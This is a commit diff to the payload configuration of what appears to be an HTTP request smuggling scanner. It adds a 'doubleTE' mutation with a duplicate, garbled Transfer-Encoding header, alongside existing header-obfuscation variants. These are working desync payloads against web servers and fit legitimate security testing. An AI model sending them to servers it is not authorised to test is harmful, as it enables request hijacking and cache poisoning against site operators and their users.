c66e3df734bf2d52c64d61d48d8389643e13bcda
Ricardo Iramar <ricardo.iramar@gmail.com>
2021-11-06 19:34:53 -0300

    updates

--- configs/default.py
+++ configs/default.py
@@ -11,11 +11,25 @@ def render_template(gadget):
 	p.header += "Content-Length: __REPLACE_CL__" + RN
 	return p
 
+def render_template_doubleTE(gadget):
+	RN = "\r\n"
+	p = Payload()
+	p.header  = "__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1" + RN
+	p.header += "Transfer-Encoding: chunked" + RN
+	p.header += gadget + RN
+	p.header += "Host: __HOST__" + RN
+	p.header += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36" + RN
+	p.header += "Content-type: application/x-www-form-urlencoded; charset=UTF-8" + RN
+	p.header += "Content-Length: __REPLACE_CL__" + RN
+	return p
+
 
 mutations["nameprefix1"] = render_template(" Transfer-Encoding: chunked")
 mutations["tabprefix1"] = render_template("Transfer-Encoding:\tchunked")
 mutations["tabprefix2"] = render_template("Transfer-Encoding\t:\tchunked")
 mutations["space1"] = render_template("Transfer-Encoding : chunked")
+
+mutations["doubleTE"] = render_template_doubleTE("Transfer-Encoding: xxxxxxx")
 
 for i in [0x1,0x4,0x8,0x9,0xa,0xb,0xc,0xd,0xf,0x1f,0x20,0x7f,0xa0,0xff]:
 	mutations["midspace-%02x"%i] = render_template("Transfer-Encoding:%cchunked"%(i))
